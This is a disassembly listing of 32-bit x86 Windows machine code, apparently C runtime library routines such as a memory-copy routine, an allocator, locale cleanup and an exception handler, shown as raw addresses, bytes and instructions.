  415484:	f7 c7 03 00 00 00    	test   $0x3,%edi
  41548a:	75 24                	jne    0x4154b0
  41548c:	c1 e9 02             	shr    $0x2,%ecx
  41548f:	83 e2 03             	and    $0x3,%edx
  415492:	83 f9 08             	cmp    $0x8,%ecx
  415495:	72 0d                	jb     0x4154a4
  415497:	fd                   	std
  415498:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  41549a:	fc                   	cld
  41549b:	ff 24 95 c8 55 41 00 	jmp    *0x4155c8(,%edx,4)
  4154a2:	8b ff                	mov    %edi,%edi
  4154a4:	f7 d9                	neg    %ecx
  4154a6:	ff 24 8d 78 55 41 00 	jmp    *0x415578(,%ecx,4)
  4154ad:	8d 49 00             	lea    0x0(%ecx),%ecx
  4154b0:	8b c7                	mov    %edi,%eax
  4154b2:	ba 03 00 00 00       	mov    $0x3,%edx
  4154b7:	83 f9 04             	cmp    $0x4,%ecx
  4154ba:	72 0c                	jb     0x4154c8
  4154bc:	83 e0 03             	and    $0x3,%eax
  4154bf:	2b c8                	sub    %eax,%ecx
  4154c1:	ff 24 85 cc 54 41 00 	jmp    *0x4154cc(,%eax,4)
  4154c8:	ff 24 8d c8 55 41 00 	jmp    *0x4155c8(,%ecx,4)
  4154cf:	90                   	nop
  4154d0:	dc 54 41 00          	fcoml  0x0(%ecx,%eax,2)
  4154d4:	00 55 41             	add    %dl,0x41(%ebp)
  4154d7:	00 28                	add    %ch,(%eax)
  4154d9:	55                   	push   %ebp
  4154da:	41                   	inc    %ecx
  4154db:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  4154e1:	88 47 03             	mov    %al,0x3(%edi)
  4154e4:	83 ee 01             	sub    $0x1,%esi
  4154e7:	c1 e9 02             	shr    $0x2,%ecx
  4154ea:	83 ef 01             	sub    $0x1,%edi
  4154ed:	83 f9 08             	cmp    $0x8,%ecx
  4154f0:	72 b2                	jb     0x4154a4
  4154f2:	fd                   	std
  4154f3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4154f5:	fc                   	cld
  4154f6:	ff 24 95 c8 55 41 00 	jmp    *0x4155c8(,%edx,4)
  4154fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  415500:	8a 46 03             	mov    0x3(%esi),%al
  415503:	23 d1                	and    %ecx,%edx
  415505:	88 47 03             	mov    %al,0x3(%edi)
  415508:	8a 46 02             	mov    0x2(%esi),%al
  41550b:	c1 e9 02             	shr    $0x2,%ecx
  41550e:	88 47 02             	mov    %al,0x2(%edi)
  415511:	83 ee 02             	sub    $0x2,%esi
  415514:	83 ef 02             	sub    $0x2,%edi
  415517:	83 f9 08             	cmp    $0x8,%ecx
  41551a:	72 88                	jb     0x4154a4
  41551c:	fd                   	std
  41551d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  41551f:	fc                   	cld
  415520:	ff 24 95 c8 55 41 00 	jmp    *0x4155c8(,%edx,4)
  415527:	90                   	nop
  415528:	8a 46 03             	mov    0x3(%esi),%al
  41552b:	23 d1                	and    %ecx,%edx
  41552d:	88 47 03             	mov    %al,0x3(%edi)
  415530:	8a 46 02             	mov    0x2(%esi),%al
  415533:	88 47 02             	mov    %al,0x2(%edi)
  415536:	8a 46 01             	mov    0x1(%esi),%al
  415539:	c1 e9 02             	shr    $0x2,%ecx
  41553c:	88 47 01             	mov    %al,0x1(%edi)
  41553f:	83 ee 03             	sub    $0x3,%esi
  415542:	83 ef 03             	sub    $0x3,%edi
  415545:	83 f9 08             	cmp    $0x8,%ecx
  415548:	0f 82 56 ff ff ff    	jb     0x4154a4
  41554e:	fd                   	std
  41554f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  415551:	fc                   	cld
  415552:	ff 24 95 c8 55 41 00 	jmp    *0x4155c8(,%edx,4)
  415559:	8d 49 00             	lea    0x0(%ecx),%ecx
  41555c:	7c 55                	jl     0x4155b3
  41555e:	41                   	inc    %ecx
  41555f:	00 84 55 41 00 8c 55 	add    %al,0x558c0041(%ebp,%edx,2)
  415566:	41                   	inc    %ecx
  415567:	00 94 55 41 00 9c 55 	add    %dl,0x559c0041(%ebp,%edx,2)
  41556e:	41                   	inc    %ecx
  41556f:	00 a4 55 41 00 ac 55 	add    %ah,0x55ac0041(%ebp,%edx,2)
  415576:	41                   	inc    %ecx
  415577:	00 bf 55 41 00 8b    	add    %bh,-0x74ffbeab(%edi)
  41557d:	44                   	inc    %esp
  41557e:	8e 1c 89             	mov    (%ecx,%ecx,4),%ds
  415581:	44                   	inc    %esp
  415582:	8f                   	(bad)
  415583:	1c 8b                	sbb    $0x8b,%al
  415585:	44                   	inc    %esp
  415586:	8e 18                	mov    (%eax),%ds
  415588:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  41558c:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  415590:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  415594:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  415598:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  41559c:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  4155a0:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  4155a4:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  4155a8:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  4155ac:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  4155b0:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  4155b4:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4155bb:	03 f0                	add    %eax,%esi
  4155bd:	03 f8                	add    %eax,%edi
  4155bf:	ff 24 95 c8 55 41 00 	jmp    *0x4155c8(,%edx,4)
  4155c6:	8b ff                	mov    %edi,%edi
  4155c8:	d8 55 41             	fcoms  0x41(%ebp)
  4155cb:	00 e0                	add    %ah,%al
  4155cd:	55                   	push   %ebp
  4155ce:	41                   	inc    %ecx
  4155cf:	00 f0                	add    %dh,%al
  4155d1:	55                   	push   %ebp
  4155d2:	41                   	inc    %ecx
  4155d3:	00 04 56             	add    %al,(%esi,%edx,2)
  4155d6:	41                   	inc    %ecx
  4155d7:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  4155dd:	c9                   	leave
  4155de:	c3                   	ret
  4155df:	90                   	nop
  4155e0:	8a 46 03             	mov    0x3(%esi),%al
  4155e3:	88 47 03             	mov    %al,0x3(%edi)
  4155e6:	8b 45 08             	mov    0x8(%ebp),%eax
  4155e9:	5e                   	pop    %esi
  4155ea:	5f                   	pop    %edi
  4155eb:	c9                   	leave
  4155ec:	c3                   	ret
  4155ed:	8d 49 00             	lea    0x0(%ecx),%ecx
  4155f0:	8a 46 03             	mov    0x3(%esi),%al
  4155f3:	88 47 03             	mov    %al,0x3(%edi)
  4155f6:	8a 46 02             	mov    0x2(%esi),%al
  4155f9:	88 47 02             	mov    %al,0x2(%edi)
  4155fc:	8b 45 08             	mov    0x8(%ebp),%eax
  4155ff:	5e                   	pop    %esi
  415600:	5f                   	pop    %edi
  415601:	c9                   	leave
  415602:	c3                   	ret
  415603:	90                   	nop
  415604:	8a 46 03             	mov    0x3(%esi),%al
  415607:	88 47 03             	mov    %al,0x3(%edi)
  41560a:	8a 46 02             	mov    0x2(%esi),%al
  41560d:	88 47 02             	mov    %al,0x2(%edi)
  415610:	8a 46 01             	mov    0x1(%esi),%al
  415613:	88 47 01             	mov    %al,0x1(%edi)
  415616:	8b 45 08             	mov    0x8(%ebp),%eax
  415619:	5e                   	pop    %esi
  41561a:	5f                   	pop    %edi
  41561b:	c9                   	leave
  41561c:	c3                   	ret
  41561d:	ff 74 24 04          	push   0x4(%esp)
  415621:	ff 15 04 81 41 00    	call   *0x418104
  415627:	33 c0                	xor    %eax,%eax
  415629:	40                   	inc    %eax
  41562a:	c2 08 00             	ret    $0x8
  41562d:	6a 10                	push   $0x10
  41562f:	68 78 86 41 00       	push   $0x418678
  415634:	e8 db d9 ff ff       	call   0x413014
  415639:	a1 58 6f 45 00       	mov    0x456f58,%eax
  41563e:	85 c0                	test   %eax,%eax
  415640:	75 37                	jne    0x415679
  415642:	83 3d 8c 6c 45 00 01 	cmpl   $0x1,0x456c8c
  415649:	74 24                	je     0x41566f
  41564b:	68 64 86 41 00       	push   $0x418664
  415650:	ff 15 10 80 41 00    	call   *0x418010
  415656:	85 c0                	test   %eax,%eax
  415658:	74 15                	je     0x41566f
  41565a:	68 3c 86 41 00       	push   $0x41863c
  41565f:	50                   	push   %eax
  415660:	ff 15 08 80 41 00    	call   *0x418008
  415666:	a3 58 6f 45 00       	mov    %eax,0x456f58
  41566b:	85 c0                	test   %eax,%eax
  41566d:	75 0a                	jne    0x415679
  41566f:	b8 1d 56 41 00       	mov    $0x41561d,%eax
  415674:	a3 58 6f 45 00       	mov    %eax,0x456f58
  415679:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  41567d:	ff 75 0c             	push   0xc(%ebp)
  415680:	ff 75 08             	push   0x8(%ebp)
  415683:	ff d0                	call   *%eax
  415685:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  415688:	eb 24                	jmp    0x4156ae
  41568a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  41568d:	8b 00                	mov    (%eax),%eax
  41568f:	8b 00                	mov    (%eax),%eax
  415691:	89 45 e0             	mov    %eax,-0x20(%ebp)
  415694:	33 c0                	xor    %eax,%eax
  415696:	40                   	inc    %eax
  415697:	c3                   	ret
  415698:	8b 65 e8             	mov    -0x18(%ebp),%esp
  41569b:	81 7d e0 17 00 00 c0 	cmpl   $0xc0000017,-0x20(%ebp)
  4156a2:	75 08                	jne    0x4156ac
  4156a4:	6a 08                	push   $0x8
  4156a6:	ff 15 c8 80 41 00    	call   *0x4180c8
  4156ac:	33 c0                	xor    %eax,%eax
  4156ae:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4156b2:	e8 98 d9 ff ff       	call   0x41304f
  4156b7:	c3                   	ret
  4156b8:	6a 10                	push   $0x10
  4156ba:	68 88 86 41 00       	push   $0x418688
  4156bf:	e8 50 d9 ff ff       	call   0x413014
  4156c4:	8b 75 08             	mov    0x8(%ebp),%esi
  4156c7:	0f af 75 0c          	imul   0xc(%ebp),%esi
  4156cb:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4156ce:	85 f6                	test   %esi,%esi
  4156d0:	75 01                	jne    0x4156d3
  4156d2:	46                   	inc    %esi
  4156d3:	33 ff                	xor    %edi,%edi
  4156d5:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4156d8:	83 fe e0             	cmp    $0xffffffe0,%esi
  4156db:	77 65                	ja     0x415742
  4156dd:	83 3d 40 73 45 00 03 	cmpl   $0x3,0x457340
  4156e4:	75 47                	jne    0x41572d
  4156e6:	83 c6 0f             	add    $0xf,%esi
  4156e9:	83 e6 f0             	and    $0xfffffff0,%esi
  4156ec:	89 75 0c             	mov    %esi,0xc(%ebp)
  4156ef:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  4156f2:	3b 1d 2c 73 45 00    	cmp    0x45732c,%ebx
  4156f8:	77 33                	ja     0x41572d
  4156fa:	6a 04                	push   $0x4
  4156fc:	e8 22 e8 ff ff       	call   0x413f23
  415701:	59                   	pop    %ecx
  415702:	21 7d fc             	and    %edi,-0x4(%ebp)
  415705:	53                   	push   %ebx
  415706:	e8 70 f0 ff ff       	call   0x41477b
  41570b:	59                   	pop    %ecx
  41570c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  41570f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  415713:	e8 4a 00 00 00       	call   0x415762
  415718:	8b 7d e0             	mov    -0x20(%ebp),%edi
  41571b:	85 ff                	test   %edi,%edi
  41571d:	74 12                	je     0x415731
  41571f:	ff 75 e4             	push   -0x1c(%ebp)
  415722:	6a 00                	push   $0x0
  415724:	57                   	push   %edi
  415725:	e8 f6 e4 ff ff       	call   0x413c20
  41572a:	83 c4 0c             	add    $0xc,%esp
  41572d:	85 ff                	test   %edi,%edi
  41572f:	75 3a                	jne    0x41576b
  415731:	56                   	push   %esi
  415732:	6a 08                	push   $0x8
  415734:	ff 35 3c 73 45 00    	push   0x45733c
  41573a:	ff 15 8c 80 41 00    	call   *0x41808c
  415740:	8b f8                	mov    %eax,%edi
  415742:	85 ff                	test   %edi,%edi
  415744:	75 25                	jne    0x41576b
  415746:	39 3d 3c 6f 45 00    	cmp    %edi,0x456f3c
  41574c:	74 1d                	je     0x41576b
  41574e:	56                   	push   %esi
  41574f:	e8 23 f3 ff ff       	call   0x414a77
  415754:	59                   	pop    %ecx
  415755:	85 c0                	test   %eax,%eax
  415757:	0f 85 76 ff ff ff    	jne    0x4156d3
  41575d:	eb 0e                	jmp    0x41576d
  41575f:	8b 75 0c             	mov    0xc(%ebp),%esi
  415762:	6a 04                	push   $0x4
  415764:	e8 26 e7 ff ff       	call   0x413e8f
  415769:	59                   	pop    %ecx
  41576a:	c3                   	ret
  41576b:	8b c7                	mov    %edi,%eax
  41576d:	e8 dd d8 ff ff       	call   0x41304f
  415772:	c3                   	ret
  415773:	56                   	push   %esi
  415774:	8b 74 24 08          	mov    0x8(%esp),%esi
  415778:	8b 46 3c             	mov    0x3c(%esi),%eax
  41577b:	57                   	push   %edi
  41577c:	33 ff                	xor    %edi,%edi
  41577e:	3b 05 b0 6f 45 00    	cmp    0x456fb0,%eax
  415784:	74 63                	je     0x4157e9
  415786:	3b c7                	cmp    %edi,%eax
  415788:	74 5f                	je     0x4157e9
  41578a:	8b 46 2c             	mov    0x2c(%esi),%eax
  41578d:	39 38                	cmp    %edi,(%eax)
  41578f:	75 58                	jne    0x4157e9
  415791:	8b 46 34             	mov    0x34(%esi),%eax
  415794:	3b c7                	cmp    %edi,%eax
  415796:	74 1c                	je     0x4157b4
  415798:	39 38                	cmp    %edi,(%eax)
  41579a:	75 18                	jne    0x4157b4
  41579c:	3b 05 d0 70 45 00    	cmp    0x4570d0,%eax
  4157a2:	74 10                	je     0x4157b4
  4157a4:	50                   	push   %eax
  4157a5:	e8 20 ca ff ff       	call   0x4121ca
  4157aa:	ff 76 3c             	push   0x3c(%esi)
  4157ad:	e8 9e 16 00 00       	call   0x416e50
  4157b2:	59                   	pop    %ecx
  4157b3:	59                   	pop    %ecx
  4157b4:	8b 46 30             	mov    0x30(%esi),%eax
  4157b7:	3b c7                	cmp    %edi,%eax
  4157b9:	74 1c                	je     0x4157d7
  4157bb:	39 38                	cmp    %edi,(%eax)
  4157bd:	75 18                	jne    0x4157d7
  4157bf:	3b 05 d4 70 45 00    	cmp    0x4570d4,%eax
  4157c5:	74 10                	je     0x4157d7
  4157c7:	50                   	push   %eax
  4157c8:	e8 fd c9 ff ff       	call   0x4121ca
  4157cd:	ff 76 3c             	push   0x3c(%esi)
  4157d0:	e8 1c 16 00 00       	call   0x416df1
  4157d5:	59                   	pop    %ecx
  4157d6:	59                   	pop    %ecx
  4157d7:	ff 76 2c             	push   0x2c(%esi)
  4157da:	e8 eb c9 ff ff       	call   0x4121ca
  4157df:	ff 76 3c             	push   0x3c(%esi)
  4157e2:	e8 e3 c9 ff ff       	call   0x4121ca
  4157e7:	59                   	pop    %ecx
  4157e8:	59                   	pop    %ecx
  4157e9:	8b 46 40             	mov    0x40(%esi),%eax
  4157ec:	3b 05 cc 70 45 00    	cmp    0x4570cc,%eax
  4157f2:	74 18                	je     0x41580c
  4157f4:	3b c7                	cmp    %edi,%eax
  4157f6:	74 14                	je     0x41580c
  4157f8:	39 38                	cmp    %edi,(%eax)
  4157fa:	75 10                	jne    0x41580c
  4157fc:	50                   	push   %eax
  4157fd:	e8 c8 c9 ff ff       	call   0x4121ca
  415802:	ff 76 44             	push   0x44(%esi)
  415805:	e8 c0 c9 ff ff       	call   0x4121ca
  41580a:	59                   	pop    %ecx
  41580b:	59                   	pop    %ecx
  41580c:	8b 46 50             	mov    0x50(%esi),%eax
  41580f:	3b 05 ac 6f 45 00    	cmp    0x456fac,%eax
  415815:	74 1c                	je     0x415833
  415817:	3b c7                	cmp    %edi,%eax
  415819:	74 18                	je     0x415833
  41581b:	39 b8 b4 00 00 00    	cmp    %edi,0xb4(%eax)
  415821:	75 10                	jne    0x415833
  415823:	50                   	push   %eax
  415824:	e8 38 14 00 00       	call   0x416c61
  415829:	ff 76 50             	push   0x50(%esi)
  41582c:	e8 99 c9 ff ff       	call   0x4121ca
  415831:	59                   	pop    %ecx
  415832:	59                   	pop    %ecx
  415833:	56                   	push   %esi
  415834:	e8 91 c9 ff ff       	call   0x4121ca
  415839:	59                   	pop    %ecx
  41583a:	5f                   	pop    %edi
  41583b:	5e                   	pop    %esi
  41583c:	c3                   	ret
  41583d:	56                   	push   %esi
  41583e:	e8 83 d6 ff ff       	call   0x412ec6
  415843:	8b f0                	mov    %eax,%esi
  415845:	8b 46 64             	mov    0x64(%esi),%eax
  415848:	3b 05 9c 64 45 00    	cmp    0x45649c,%eax
  41584e:	0f 84 a6 00 00 00    	je     0x4158fa
  415854:	85 c0                	test   %eax,%eax
  415856:	74 2f                	je     0x415887
  415858:	8b 48 2c             	mov    0x2c(%eax),%ecx
  41585b:	ff 08                	decl   (%eax)
  41585d:	85 c9                	test   %ecx,%ecx
  41585f:	74 02                	je     0x415863
  415861:	ff 09                	decl   (%ecx)
  415863:	8b 48 34             	mov    0x34(%eax),%ecx
  415866:	85 c9                	test   %ecx,%ecx
  415868:	74 02                	je     0x41586c
  41586a:	ff 09                	decl   (%ecx)
  41586c:	8b 48 30             	mov    0x30(%eax),%ecx
  41586f:	85 c9                	test   %ecx,%ecx
  415871:	74 02                	je     0x415875
  415873:	ff 09                	decl   (%ecx)
  415875:	8b 48 40             	mov    0x40(%eax),%ecx
  415878:	85 c9                	test   %ecx,%ecx
  41587a:	74 02                	je     0x41587e
  41587c:	ff 09                	decl   (%ecx)
  41587e:	8b 48 4c             	mov    0x4c(%eax),%ecx
  415881:	ff 89 b4 00 00 00    	decl   0xb4(%ecx)
  415887:	8b 0d 9c 64 45 00    	mov    0x45649c,%ecx
  41588d:	89 4e 64             	mov    %ecx,0x64(%esi)
  415890:	8b 0d 9c 64 45 00    	mov    0x45649c,%ecx
  415896:	ff 01                	incl   (%ecx)
  415898:	8b 0d 9c 64 45 00    	mov    0x45649c,%ecx
  41589e:	8b 49 2c             	mov    0x2c(%ecx),%ecx
  4158a1:	85 c9                	test   %ecx,%ecx
  4158a3:	74 02                	je     0x4158a7
  4158a5:	ff 01                	incl   (%ecx)
  4158a7:	8b 0d 9c 64 45 00    	mov    0x45649c,%ecx
  4158ad:	8b 49 34             	mov    0x34(%ecx),%ecx
  4158b0:	85 c9                	test   %ecx,%ecx
  4158b2:	74 02                	je     0x4158b6
  4158b4:	ff 01                	incl   (%ecx)
  4158b6:	8b 0d 9c 64 45 00    	mov    0x45649c,%ecx
  4158bc:	8b 49 30             	mov    0x30(%ecx),%ecx
  4158bf:	85 c9                	test   %ecx,%ecx
  4158c1:	74 02                	je     0x4158c5
  4158c3:	ff 01                	incl   (%ecx)
  4158c5:	8b 0d 9c 64 45 00    	mov    0x45649c,%ecx
  4158cb:	8b 49 40             	mov    0x40(%ecx),%ecx
  4158ce:	85 c9                	test   %ecx,%ecx
  4158d0:	74 02                	je     0x4158d4
  4158d2:	ff 01                	incl   (%ecx)
  4158d4:	8b 0d 9c 64 45 00    	mov    0x45649c,%ecx
  4158da:	8b 49 4c             	mov    0x4c(%ecx),%ecx
  4158dd:	ff 81 b4 00 00 00    	incl   0xb4(%ecx)
  4158e3:	85 c0                	test   %eax,%eax
  4158e5:	74 13                	je     0x4158fa
  4158e7:	83 38 00             	cmpl   $0x0,(%eax)
  4158ea:	75 0e                	jne    0x4158fa
  4158ec:	3d 48 64 45 00       	cmp    $0x456448,%eax
  4158f1:	74 07                	je     0x4158fa
  4158f3:	50                   	push   %eax
  4158f4:	e8 7a fe ff ff       	call   0x415773
  4158f9:	59                   	pop    %ecx
  4158fa:	8b 46 64             	mov    0x64(%esi),%eax
  4158fd:	5e                   	pop    %esi
  4158fe:	c3                   	ret
  4158ff:	6a 0c                	push   $0xc
  415901:	68 18 88 41 00       	push   $0x418818
  415906:	e8 09 d7 ff ff       	call   0x413014
  41590b:	6a 0c                	push   $0xc
  41590d:	e8 11 e6 ff ff       	call   0x413f23
  415912:	59                   	pop    %ecx
  415913:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  415917:	e8 21 ff ff ff       	call   0x41583d
  41591c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  41591f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  415923:	e8 09 00 00 00       	call   0x415931
  415928:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  41592b:	e8 1f d7 ff ff       	call   0x41304f
  415930:	c3                   	ret
  415931:	6a 0c                	push   $0xc
  415933:	e8 57 e5 ff ff       	call   0x413e8f
  415938:	59                   	pop    %ecx
  415939:	c3                   	ret
  41593a:	cc                   	int3
  41593b:	cc                   	int3
  41593c:	56                   	push   %esi
  41593d:	43                   	inc    %ebx
  41593e:	32 30                	xor    (%eax),%dh
  415940:	58                   	pop    %eax
  415941:	43                   	inc    %ebx
  415942:	30 30                	xor    %dh,(%eax)
  415944:	55                   	push   %ebp
  415945:	8b ec                	mov    %esp,%ebp
  415947:	83 ec 08             	sub    $0x8,%esp
  41594a:	53                   	push   %ebx
  41594b:	56                   	push   %esi
  41594c:	57                   	push   %edi
  41594d:	55                   	push   %ebp
  41594e:	fc                   	cld
  41594f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  415952:	8b 45 08             	mov    0x8(%ebp),%eax
  415955:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  41595c:	0f 85 82 00 00 00    	jne    0x4159e4
  415962:	89 45 f8             	mov    %eax,-0x8(%ebp)
  415965:	8b 45 10             	mov    0x10(%ebp),%eax
  415968:	89 45 fc             	mov    %eax,-0x4(%ebp)
  41596b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  41596e:	89 43 fc             	mov    %eax,-0x4(%ebx)
  415971:	8b 73 0c             	mov    0xc(%ebx),%esi
  415974:	8b 7b 08             	mov    0x8(%ebx),%edi
  415977:	83 fe ff             	cmp    $0xffffffff,%esi
  41597a:	74 61                	je     0x4159dd
  41597c:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  41597f:	83 7c 8f 04 00       	cmpl   $0x0,0x4(%edi,%ecx,4)
  415984:	74 45                	je     0x4159cb
  415986:	56                   	push   %esi
  415987:	55                   	push   %ebp
  415988:	8d 6b 10             	lea    0x10(%ebx),%ebp
  41598b:	ff 54 8f 04          	call   *0x4(%edi,%ecx,4)
  41598f:	5d                   	pop    %ebp
  415990:	5e                   	pop    %esi
  415991:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  415994:	0b c0                	or     %eax,%eax
  415996:	74 33                	je     0x4159cb
  415998:	78 3c                	js     0x4159d6
  41599a:	8b 7b 08             	mov    0x8(%ebx),%edi
  41599d:	53                   	push   %ebx
  41599e:	e8 ad 17 00 00       	call   0x417150
  4159a3:	83 c4 04             	add    $0x4,%esp
  4159a6:	8d 6b 10             	lea    0x10(%ebx),%ebp
  4159a9:	56                   	push   %esi
  4159aa:	53                   	push   %ebx
  4159ab:	e8 e2 17 00 00       	call   0x417192
  4159b0:	83 c4 08             	add    $0x8,%esp
  4159b3:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  4159b6:	6a 01                	push   $0x1
  4159b8:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  4159bc:	e8 65 18 00 00       	call   0x417226
  4159c1:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  4159c4:	89 43 0c             	mov    %eax,0xc(%ebx)
  4159c7:	ff 54 8f 08          	call   *0x8(%edi,%ecx,4)
  4159cb:	8b 7b 08             	mov    0x8(%ebx),%edi
  4159ce:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  4159d1:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  4159d4:	eb a1                	jmp    0x415977
  4159d6:	b8 00 00 00 00       	mov    $0x0,%eax
  4159db:	eb 1c                	jmp    0x4159f9
  4159dd:	b8 01 00 00 00       	mov    $0x1,%eax
  4159e2:	eb 15                	jmp    0x4159f9
  4159e4:	55                   	push   %ebp
  4159e5:	8d 6b 10             	lea    0x10(%ebx),%ebp
  4159e8:	6a ff                	push   $0xffffffff
  4159ea:	53                   	push   %ebx
  4159eb:	e8 a2 17 00 00       	call   0x417192
  4159f0:	83 c4 08             	add    $0x8,%esp
  4159f3:	5d                   	pop    %ebp
  4159f4:	b8 01 00 00 00       	mov    $0x1,%eax
  4159f9:	5d                   	pop    %ebp
  4159fa:	5f                   	pop    %edi
  4159fb:	5e                   	pop    %esi
  4159fc:	5b                   	pop    %ebx
  4159fd:	8b e5                	mov    %ebp,%esp
  4159ff:	5d                   	pop    %ebp
  415a00:	c3                   	ret
  415a01:	55                   	push   %ebp
  415a02:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  415a06:	8b 29                	mov    (%ecx),%ebp
  415a08:	8b 41 1c             	mov    0x1c(%ecx),%eax
  415a0b:	50                   	push   %eax
  415a0c:	8b 41 18             	mov    0x18(%ecx),%eax
  415a0f:	50                   	push   %eax
  415a10:	e8 7d 17 00 00       	call   0x417192
  415a15:	83 c4 08             	add    $0x8,%esp
  415a18:	5d                   	pop    %ebp
  415a19:	c2 04 00             	ret    $0x4
  415a1c:	55                   	push   %ebp
  415a1d:	8b ec                	mov    %esp,%ebp
  415a1f:	51                   	push   %ecx
  415a20:	8b 45 0c             	mov    0xc(%ebp),%eax
  415a23:	8d 48 01             	lea    0x1(%eax),%ecx
  415a26:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  415a2c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  415a2f:	77 09                	ja     0x415a3a
  415a31:	8b 49 48             	mov    0x48(%ecx),%ecx
  415a34:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  415a38:	eb 54                	jmp    0x415a8e
  415a3a:	56                   	push   %esi
  415a3b:	8b d0                	mov    %eax,%edx
  415a3d:	c1 fa 08             	sar    $0x8,%edx
  415a40:	57                   	push   %edi
  415a41:	8b 79 48             	mov    0x48(%ecx),%edi
  415a44:	0f b6 f2             	movzbl %dl,%esi
  415a47:	f6 44 77 01 80       	testb  $0x80,0x1(%edi,%esi,2)
  415a4c:	5f                   	pop    %edi
  415a4d:	5e                   	pop    %esi
  415a4e:	74 0f                	je     0x415a5f
  415a50:	80 65 fe 00          	andb   $0x0,-0x2(%ebp)
  415a54:	6a 02                	push   $0x2
  415a56:	88 45 fd             	mov    %al,-0x3(%ebp)
  415a59:	88 55 fc             	mov    %dl,-0x4(%ebp)
  415a5c:	58                   	pop    %eax
  415a5d:	eb 0a                	jmp    0x415a69
  415a5f:	80 65 fd 00          	andb   $0x0,-0x3(%ebp)
  415a63:	88 45 fc             	mov    %al,-0x4(%ebp)
  415a66:	33 c0                	xor    %eax,%eax
  415a68:	40                   	inc    %eax
  415a69:	6a 01                	push   $0x1
  415a6b:	ff 71 14             	push   0x14(%ecx)
  415a6e:	ff 71 04             	push   0x4(%ecx)
  415a71:	8d 4d 0e             	lea    0xe(%ebp),%ecx
  415a74:	51                   	push   %ecx
  415a75:	50                   	push   %eax
  415a76:	8d 45 fc             	lea    -0x4(%ebp),%eax
  415a79:	50                   	push   %eax
  415a7a:	6a 01                	push   $0x1
  415a7c:	e8 26 10 00 00       	call   0x416aa7
  415a81:	83 c4 1c             	add    $0x1c,%esp
  415a84:	85 c0                	test   %eax,%eax
  415a86:	75 02                	jne    0x415a8a
  415a88:	c9                   	leave
  415a89:	c3                   	ret
  415a8a:	0f b7 45 0e          	movzwl 0xe(%ebp),%eax
  415a8e:	23 45 10             	and    0x10(%ebp),%eax
  415a91:	c9                   	leave
  415a92:	c3                   	ret
  415a93:	6a 38                	push   $0x38
  415a95:	68 28 88 41 00       	push   $0x418828
  415a9a:	e8 75 d5 ff ff       	call   0x413014
  415a9f:	33 db                	xor    %ebx,%ebx
  415aa1:	39 1d 68 6f 45 00    	cmp    %ebx,0x456f68
  415aa7:	75 38                	jne    0x415ae1
  415aa9:	53                   	push   %ebx
  415aaa:	53                   	push   %ebx
  415aab:	33 f6                	xor    %esi,%esi
  415aad:	46                   	inc    %esi
  415aae:	56                   	push   %esi
  415aaf:	68 24 88 41 00       	push   $0x418824
  415ab4:	68 00 01 00 00       	push   $0x100
  415ab9:	53                   	push   %ebx
  415aba:	ff 15 70 80 41 00    	call   *0x418070
  415ac0:	85 c0                	test   %eax,%eax
  415ac2:	74 08                	je     0x415acc
  415ac4:	89 35 68 6f 45 00    	mov    %esi,0x456f68
  415aca:	eb 15                	jmp    0x415ae1
  415acc:	ff 15 2c 80 41 00    	call   *0x41802c
  415ad2:	83 f8 78             	cmp    $0x78,%eax
  415ad5:	75 0a                	jne    0x415ae1
  415ad7:	c7 05 68 6f 45 00 02 	movl   $0x2,0x456f68
  415ade:	00 00 00 
  415ae1:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  415ae4:	7e 1b                	jle    0x415b01
  415ae6:	8b 4d 14             	mov    0x14(%ebp),%ecx
  415ae9:	8b 45 10             	mov    0x10(%ebp),%eax
  415aec:	49                   	dec    %ecx
  415aed:	38 18                	cmp    %bl,(%eax)
  415aef:	74 08                	je     0x415af9
  415af1:	40                   	inc    %eax
  415af2:	3b cb                	cmp    %ebx,%ecx
  415af4:	75 f6                	jne    0x415aec
